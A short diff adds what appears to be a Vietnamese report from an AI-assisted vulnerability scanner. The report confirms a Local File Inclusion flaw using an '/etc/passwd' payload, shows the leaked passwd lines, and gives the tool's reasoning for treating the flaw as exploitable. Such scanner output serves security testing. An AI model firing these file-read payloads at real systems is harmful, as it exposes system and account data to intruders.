@@ -1,0 +1,8 @@
+Local File Inclusion — AI Self-Validation hoàn tất.
+      - Payload tốt nhất   : /etc/passwd
+      - Mục đích           : Absolute Path LFI
+      - Output trích xuất  : root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nolo
+      - AI Reasoning       : Dựa trên bằng chứng từ các payload như '/etc/passwd' và '/etc/hosts', output trả về chứa thông tin hệ thống thực sự như 'root:x:0:0:root:/root:/bin/bash' và '127.0.0.1	localhost', chứng tỏ lỗ hổng Local File Inclusion (LFI) tồn tại và có thể được khai thác để đọc dữ liệu hệ thống nhạy cảm.
